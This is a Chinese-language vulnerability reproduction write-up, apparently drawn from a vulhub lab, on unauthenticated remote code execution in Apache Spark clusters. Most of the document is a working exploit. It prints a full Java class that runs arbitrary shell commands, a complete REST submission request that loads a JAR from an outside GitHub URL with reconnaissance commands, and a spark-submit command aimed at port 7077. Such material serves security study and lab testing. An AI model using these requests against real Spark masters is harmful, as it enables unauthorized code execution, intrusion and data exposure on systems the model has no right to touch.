<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Apache Spark 未授权访问漏洞</h1><h2>一、漏洞简介</h2><p>Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。</p><h2>二、漏洞影响</h2><h2>三、复现过程</h2><p>该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。</p><p>提交方式有两种：</p><ul><li>利用REST API</li><li>利用submissions网关（集成在7077端口中）</li></ul><p>应用可以是Java或Python，就是一个最简单的类，</p><p>import java.io.BufferedReader;<br />import java.io.InputStreamReader;<br /><br />public class Exploit {<br />  public static void main(String[] args) throws Exception {<br />    String[] cmds = args[0].split(",");<br /><br />    for (String cmd : cmds) {<br />      System.out.println(cmd);<br />      System.out.println(executeCommand(cmd.trim()));<br />      System.out.println("==============================================");<br />    }<br />  }<br /><br />  // https://www.mkyong.com/java/how-to-execute-shell-command-from-java/<br />  private static String executeCommand(String command) {<br />    StringBuilder output = new StringBuilder();<br /><br />    try {<br />      Process p = Runtime.getRuntime().exec(command);<br />      p.waitFor();<br />      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));<br /><br />      String line;<br />      while ((line = reader.readLine()) != null) {<br />        output.append(line).append("\n");<br />      }<br />    } catch (Exception e) {<br />      e.printStackTrace();<br />    }<br /><br />    return output.toString();<br />  }<br />}</p><p>将其编译成JAR，放在任意一个HTTP或FTP上，如https://download.0-sec.org/download/Apache Spark 未授权访问漏洞.jar。</p><h3>用REST API方式提交应用</h3><p>standalone模式下，master将在6066端口启动一个HTTP服务器，我们向这个端口提交REST格式的API：</p><p>POST /v1/submissions/create HTTP/1.1<br />Host: www.0-sec.org:6066<br />Accept-Encoding: gzip, deflate<br />Accept: */*<br />Accept-Language: en<br />User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br />Content-Type: application/json<br />Connection: close<br />Content-Length: 680<br /><br />{<br />  "action": "CreateSubmissionRequest",<br />  "clientSparkVersion": "2.3.1",<br />  "appArgs": [<br />    "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"<br />  ],<br />  "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",<br />  "environmentVariables": {<br />    "SPARK_ENV_LOADED": "1"<br />  },<br />  "mainClass": "Exploit",<br />  "sparkProperties": {<br />    "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",<br />    "spark.driver.supervise": "false",<br />    "spark.app.name": "Exploit",<br />    "spark.eventLog.enabled": "true",<br />    "spark.submit.deployMode": "cluster",<br />    "spark.master": "spark://your-ip:6066"<br />  }<br />}</p><p>其中，spark.jars即是编译好的应用，mainClass是待运行的类，appArgs是传给应用的参数。</p><p>1.png</p><p>返回的包中有submissionId，然后访问http://www.0-sec.org:8081/logPage/?driverId={submissionId}&amp;logType=stdout，即可查看执行结果：</p><p>2.png</p><p>注意，提交应用是在master中，查看结果是在具体执行这个应用的slave里（默认8081端口）。实战中，由于slave可能有多个。</p><h3>利用submissions网关</h3><p>如果6066端口不能访问，或做了权限控制，我们可以利用master的主端口7077，来提交应用。</p><p>方法是利用Apache Spark自带的脚本bin/spark-submit：</p><p>bin/spark-submit --master spark://www.0-sec.org:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id</p><p>如果你指定的master参数是rest服务器，这个脚本会先尝试使用rest api来提交应用；如果发现不是rest服务器，则会降级到使用submission gateway来提交应用。</p><p>查看结果的方式与前面一致。</p><h2>参考链接</h2><p>https://vulhub.org/#/environments/spark/unacc/</p></body></html>